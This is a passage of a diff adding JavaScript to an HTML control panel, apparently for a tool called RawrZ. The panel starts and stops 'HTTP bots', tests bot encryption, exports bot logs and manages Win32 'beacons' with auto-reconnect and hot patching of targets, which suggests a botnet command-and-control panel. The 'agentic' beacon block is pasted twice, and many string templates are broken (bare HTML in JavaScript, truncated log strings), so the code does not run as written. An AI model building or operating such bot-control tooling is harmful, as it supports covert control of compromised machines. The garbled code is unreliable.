+        }
+        
+        async function restartBots() {
+            if (!confirm('Restart all bots?')) return;
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            const result = await apiCall('/http-bot-stop-all', 'POST');
+            await apiCall('/http-bot-start-all', 'POST');
+            document.getElementById('manage-output').textContent = 'Restart all requested. Stopped: ' + (result.data && result.data.stopped);
+        }
+        
+        async function testEncryption() {
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            const result = await apiCall('/http-bot-encrypt', 'POST', {});
+            alert(result.status === 200 ? 'Encryption test OK. Status: ' + (result.data.status || 'encrypted') : 'Test failed. Start server with npm start.');
+        }
+        
+        async function exportLogs() {
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            const result = await apiCall('/http-bot-monitor', 'POST', {});
+            if (result.status === 200 && result.data) {
+                const blob = new Blob([JSON.stringify(result.data, null, 2)], { type: 'application/json' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = 'http-bot-logs-' + Date.now() + '.json';
+                a.click();
+                URL.revokeObjectURL(a.href);
+                alert('Logs exported.');
+            } else { alert('Export failed. Start server with npm start.'); }
+        }
+        
+        function clearLogs() {
+            if (confirm('Are you sure you want to clear all logs?')) {
+                document.getElementById('monitor-output').textContent = 'Logs cleared.';
+            }
+        }
+        
+        async function testBotEngine() {
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            const result = await apiCall('/http-bot-list', 'GET');
+            alert(result.status === 200 ? 'HTTP bot engine OK. Bots: ' + (result.data.bots && result.data.bots.length) + '' : 'Test failed. Start server with npm start.');
+        }
+        
+        function viewTemplates() {
+            alert('Create a bot with type and server URL. Use Manage/Encrypt/Monitor tabs for operations.');
+        }
+        
+        async function updateTemplates() {
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            loadBots();
+            alert('Bot list refreshed from server.');
+        }
+        
+        function clearAll() {
+            if (confirm('Are you sure you want to clear all bot data?')) {
+                document.getElementById('create-output').textContent = 'Generated bot will appear here...';
+                document.getElementById('manage-output').textContent = 'Bot management results will appear here...';
+                document.getElementById('encrypt-output').textContent = 'Encryption configuration will appear here...';
+                document.getElementById('monitor-output').textContent = 'Monitoring data will appear here...';
+                stopMonitoring();
+            }
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add a small delay to ensure all elements are fully loaded
+            setTimeout(() => {
+                // Add event listeners to all tab buttons
+                const tabButtons = document.querySelectorAll('.nav-tab[data-tab]');
+                tabButtons.forEach(button => {
+                    button.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        const tabName = this.getAttribute('data-tab');
+                        console.log('Tab button clicked:', tabName);
+                        showTab(tabName, this);
+                    });
+                });
+            }, 100);
+        });
+        
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', function() {
+            if (monitoringInterval) clearInterval(monitoringInterval);
+        });
+    
+        // ===== AGENTIC AUTONOMOUS WIN32 FUNCTIONS =====
+
+        // Initialize agentic controls and beacon connectivity
+        async function initializeAgenticControls() {
+            try {
+                // Initialize the AgenticBeaconManager
+                await window.agenticBeaconManager.initialize();
+
+                // Establish circular connectivity with other panels
+                await window.agenticBeaconManager.establishCircularConnectivity();
+
+                // Update beacon status display
+                updateBeaconStatus();
+
+                // Start autonomous monitoring
+                startAutonomousMonitoring();
+
+                // Update status indicator
+                document.getElementById('agentic-status-indicator').classList.remove('offline');
+                document.getElementById('agentic-status-text').textContent = 'Active';
+
+                console.log('Agentic controls initialized successfully');
+            } catch (error) {
+                console.error('Failed to initialize agentic controls:', error);
+                document.getElementById('agentic-status-indicator').classList.add('offline');
+                document.getElementById('agentic-status-text').textContent = 'Error';
+                displayError('Agentic initialization failed: ' + error.message);
+            }
+        }
+
+        // Update beacon connectivity status display
+        function updateBeaconStatus() {
+            const beaconGrid = document.getElementById('beacon-grid');
+            if (!beaconGrid) return;
+
+            const beacons = window.agenticBeaconManager.getBeaconStatus();
+            let html = '';
+
+            Object.entries(beacons).forEach(([type, status]) => {
+                const statusClass = status.connected ? 'beacon-connected' : 'beacon-disconnected';
+                const statusText = status.connected ? 'Connected' : 'Disconnected';
+
+                html += 
+                    <div class="beacon-item ">
+                        <div class="beacon-icon"></div>
+                        <div class="beacon-info">
+                            <div class="beacon-type"></div>
+                            <div class="beacon-status"></div>
+                        </div>
+                    </div>
+                ;
+            });
+
+            beaconGrid.innerHTML = html;
+        }
+
+        // Get icon for beacon type
+        function getBeaconIcon(type) {
+            const icons = {
+                'encryption': '🔐',
+                'native': '⚙️',
+                'java': '☕',
+                'dotnet': '🔷',
+                'web': '🌐'
+            };
+            return icons[type] || '📡';
+        }
+
+        // Start autonomous monitoring loop
+        function startAutonomousMonitoring() {
+            setInterval(async () => {
+                try {
+                    // Check beacon connectivity
+                    await window.agenticBeaconManager.checkBeaconHealth();
+
+                    // Update status display
+                    updateBeaconStatus();
+
+                    // Perform autonomous actions if enabled
+                    if (document.getElementById('autonomous-mode').checked) {
+                        await performAutonomousActions();
+                    }
+                } catch (error) {
+                    console.error('Autonomous monitoring error:', error);
+                }
+            }, 5000); // Check every 5 seconds
+        }
+
+        // Perform autonomous agentic actions
+        async function performAutonomousActions() {
+            try {
+                // Get system status
+                const systemStatus = await window.agenticBeaconManager.getSystemStatus();
+
+                // Auto-heal disconnected beacons
+                for (const [type, status] of Object.entries(systemStatus.beacons)) {
+                    if (!status.connected) {
+                        console.log(Auto-healing  beacon...);
+                        await window.agenticBeaconManager.reconnectBeacon(type);
+                    }
+                }
+
+                // Auto-optimize performance
+                if (systemStatus.performance.cpu > 80) {
+                    await window.agenticBeaconManager.optimizePerformance('cpu');
+                }
+
+                if (systemStatus.performance.memory > 85) {
+                    await window.agenticBeaconManager.optimizePerformance('memory');
+                }
+
+            } catch (error) {
+                console.error('Autonomous action error:', error);
+            }
+        }
+
+        // Execute Win32 agentic operation
+        async function executeWin32Operation(operation, params = {}) {
+            try {
+                const result = await window.agenticBeaconManager.executeWin32Operation(operation, params);
+
+                // Display result
+                displayAgenticResult('Win32 Operation', operation, result);
+
+                // Update status
+                updateBeaconStatus();
+
+                return result;
+            } catch (error) {
+                displayError(Win32 operation failed: );
+                throw error;
+            }
+        }
+
+        // Apply hot patch to target
+        async function applyHotPatch(targetType, targetId, patchData) {
+            try {
+                const result = await window.agenticBeaconManager.applyHotPatch(targetType, targetId, patchData);
+
+                displayAgenticResult('Hot Patch Applied', ${targetType}:, result);
+
+                // Update status
+                updateBeaconStatus();
+
+                return result;
+            } catch (error) {
+                displayError(Hot patch failed: );
+                throw error;
+            }
+        }
+
+        // Display agentic operation results
+        function displayAgenticResult(operation, details, result) {
+            const output = document.getElementById('agentic-output');
+            if (!output) return;
+
+            const timestamp = new Date().toLocaleTimeString();
+            const html = 
+                <div class="agentic-result">
+                    <div class="agentic-header">
+                        <span class="agentic-timestamp"></span>
+                        <span class="agentic-operation"></span>
+                    </div>
+                    <div class="agentic-details"></div>
+                    <div class="agentic-data">
+                        <pre></pre>
+                    </div>
+                </div>
+            ;
+
+            output.innerHTML = html + output.innerHTML; // Prepend new results
+        }
+
+        // Manual beacon reconnection
+        async function reconnectBeacon(beaconType) {
+            try {
+                const result = await window.agenticBeaconManager.reconnectBeacon(beaconType);
+                displayAgenticResult('Beacon Reconnected', beaconType, result);
+                updateBeaconStatus();
+            } catch (error) {
+                displayError(Beacon reconnection failed: );
+            }
+        }
+
+        // Get comprehensive system status
+        async function getSystemStatus() {
+            try {
+                const status = await window.agenticBeaconManager.getSystemStatus();
+                displayAgenticResult('System Status', 'Full Report', status);
+                return status;
+            } catch (error) {
+                displayError(System status check failed: );
+                throw error;
+            }
+        }
+
+        // Emergency system lockdown
+        async function emergencyLockdown() {
+            if (!confirm('Are you sure you want to initiate emergency lockdown? This will disconnect all beacons and halt autonomous operations.')) {
+                return;
+            }
+
+            try {
+                const result = await window.agenticBeaconManager.emergencyLockdown();
+                displayAgenticResult('Emergency Lockdown', 'Executed', result);
+
+                // Disable autonomous mode
+                document.getElementById('autonomous-mode').checked = false;
+
+                // Update status
+                updateBeaconStatus();
+
+                alert('Emergency lockdown completed. All autonomous operations halted.');
+            } catch (error) {
+                displayError(Emergency lockdown failed: );
+            }
+        }
+
+        // Toggle autonomous mode
+        function toggleAutonomousMode() {
+            const checkbox = document.getElementById('autonomous-mode');
+            const status = checkbox.checked ? 'Autonomous Mode Enabled' : 'Autonomous Mode Disabled';
+            displayAgenticResult('Mode Change', status, { autonomous: checkbox.checked });
+        }
+
+        // Export agentic session data
+        async function exportSessionData() {
+            try {
+                const data = await window.agenticBeaconManager.exportSessionData();
+                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = gentic-session-.json;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+
+                URL.revokeObjectURL(url);
+
+                displayAgenticResult('Session Export', 'Data exported successfully', { filename: a.download });
+            } catch (error) {
+                displayError(Session export failed: );
+            }
+        }
+
+        // Initialize agentic controls on page load
+        document.addEventListener('DOMContentLoaded', function () {
+            // Initialize agentic controls
+            initializeAgenticControls();
+        });
+    </script>
+    <script>
+        // ===== AGENTIC AUTONOMOUS WIN32 FUNCTIONS =====
+
+        // Initialize agentic controls and beacon connectivity
+        async function initializeAgenticControls() {
+            try {
+                // Initialize the AgenticBeaconManager
+                await window.agenticBeaconManager.initialize();
+
+                // Establish circular connectivity with other panels
+                await window.agenticBeaconManager.establishCircularConnectivity();
+
+                // Update beacon status display
+                updateBeaconStatus();
+
+                // Start autonomous monitoring
+                startAutonomousMonitoring();
+
+                // Update status indicator
+                const indicator = document.getElementById('agentic-status-indicator');
+                const text = document.getElementById('agentic-status-text');
+                if (indicator) indicator.classList.remove('offline');
+                if (text) text.textContent = 'Active';
+
+                console.log('Agentic controls initialized successfully');
+            } catch (error) {
+                console.error('Failed to initialize agentic controls:', error);
+                const indicator = document.getElementById('agentic-status-indicator');
+                const text = document.getElementById('agentic-status-text');
+                if (indicator) indicator.classList.add('offline');
+                if (text) text.textContent = 'Error';
+            }
+        }
+
+        // Update beacon connectivity status display
+        function updateBeaconStatus() {
+            const beaconGrid = document.getElementById('beacon-grid');
+            if (!beaconGrid) return;
+
+            const beacons = window.agenticBeaconManager.getBeaconStatus();
+            let html = '';
+
+            Object.entries(beacons).forEach(([type, status]) => {
+                const statusClass = status.connected ? 'beacon-connected' : 'beacon-disconnected';
+                const statusText = status.connected ? 'Connected' : 'Disconnected';
+
+                html += <div class="beacon-item "> +
+                        <div class="beacon-icon"></div> +
+                        <div class="beacon-info"> +
+                        <div class="beacon-type"></div> +
+                        <div class="beacon-status"></div> +
+                        </div></div>;
+            });
+
+            beaconGrid.innerHTML = html;
+        }
+
+        // Get icon for beacon type
+        function getBeaconIcon(type) {
+            const icons = {
+                'encryption': '🔐',
+                'native': '⚙️',
+                'java': '☕',
+                'dotnet': '🔷',
+                'web': '🌐'
+            };
+            return icons[type] || '📡';
+        }
+
+        // Start autonomous monitoring loop
+        function startAutonomousMonitoring() {
+            setInterval(async () => {
+                try {
+                    // Check beacon connectivity
+                    await window.agenticBeaconManager.checkBeaconHealth();
+
+                    // Update status display
+                    updateBeaconStatus();
+
+                    // Perform autonomous actions if enabled
+                    const checkbox = document.getElementById('autonomous-mode');
+                    if (checkbox && checkbox.checked) {
+                        await performAutonomousActions();
+                    }
+                } catch (error) {
+                    console.error('Autonomous monitoring error:', error);
+                }
+            }, 5000);
+        }
+
+        // Perform autonomous agentic actions
+        async function performAutonomousActions() {
+            try {
+                const systemStatus = await window.agenticBeaconManager.getSystemStatus();
+
+                // Auto-heal disconnected beacons
+                for (const [type, status] of Object.entries(systemStatus.beacons)) {
+                    if (!status.connected) {
+                        console.log(Auto-healing  beacon...);
+                        await window.agenticBeaconManager.reconnectBeacon(type);
+                    }
+                }
+
+                // Auto-optimize performance
+                if (systemStatus.performance.cpu > 80) {
+                    await window.agenticBeaconManager.optimizePerformance('cpu');
+                }
+
+                if (systemStatus.performance.memory > 85) {
+                    await window.agenticBeaconManager.optimizePerformance('memory');
+                }
+            } catch (error) {
+                console.error('Autonomous action error:', error);
+            }
+        }
+
+        // Execute Win32 agentic operation
+        async function executeWin32Operation(operation, params = {}) {
+            try {
+                const result = await window.agenticBeaconManager.executeWin32Operation(operation, params);
+                displayAgenticResult('Win32 Operation', operation, result);
+                updateBeaconStatus();
+                return result;
+            } catch (error) {
+                console.error(Win32 operation failed: );
+                throw error;
+            }
+        }
+
+        // Apply hot patch to target
+        async function applyHotPatch(targetType, targetId, patchData) {
+            try {
+                const result = await window.agenticBeaconManager.applyHotPatch(targetType, targetId, patchData);
+                displayAgenticResult('Hot Patch Applied', ${targetType}:, result);
+                updateBeaconStatus();
+                return result;
+            } catch (error) {
+                console.error(Hot patch failed: );
+                throw error;
+            }
+        }
+
+        // Display agentic operation results
+        function displayAgenticResult(operation, details, result) {
+            const output = document.getElementById('agentic-output');
+            if (!output) return;
+
+            const timestamp = new Date().toLocaleTimeString();
+            const html = <div class="agentic-result"> +
+                        <div class="agentic-header"> +
+                        <span class="agentic-timestamp"></span> +
+                        <span class="agentic-operation"></span> +
+                        </div> +
+                        <div class="agentic-details"></div> +
+                        <div class="agentic-data"> +
+                        <pre></pre> +
+                        </div></div>;
+
+            output.innerHTML = html + output.innerHTML;
+        }
+
+        // Manual beacon reconnection
+        async function reconnectBeacon(beaconType) {
+            try {
+                const result = await window.agenticBeaconManager.reconnectBeacon(beaconType);
+                displayAgenticResult('Beacon Reconnected', beaconType, result);
+                updateBeaconStatus();
+            } catch (error) {
+                console.error(Beacon reconnection failed: );
+            }
+        }
+
+        // Get comprehensive system status
+        async function getSystemStatus() {
+            try {
+                const status = await window.agenticBeaconManager.getSystemStatus();
+                displayAgenticResult('System Status', 'Full Report', status);
+                return status;
+            } catch (error) {
+                console.error(System status check failed: );
+                throw error;
+            }
+        }
+
+        // Emergency system lockdown
+        async function emergencyLockdown() {
+            if (!confirm('Emergency lockdown? This will disconnect all beacons.')) {
+                return;
+            }
+
+            try {
+                const result = await window.agenticBeaconManager.emergencyLockdown();
+                displayAgenticResult('Emergency Lockdown', 'Executed', result);
+
+                const checkbox = document.getElementById('autonomous-mode');
+                if (checkbox) checkbox.checked = false;
+
+                updateBeaconStatus();
+                alert('Emergency lockdown completed.');
+            } catch (error) {
+                console.error(Emergency lockdown failed: );
+            }
+        }
+
+        // Toggle autonomous mode
+        function toggleAutonomousMode() {
+            const checkbox = document.getElementById('autonomous-mode');
+            const status = checkbox.checked ? 'Autonomous Mode Enabled' : 'Autonomous Mode Disabled';
+            displayAgenticResult('Mode Change', status, { autonomous: checkbox.checked });
+        }
+
+        // Initialize agentic controls on page load
+        document.addEventListener('DOMContentLoaded', function () {
+            initializeAgenticControls();
+        });
+    </script>
+</body>
+</html>
+
+
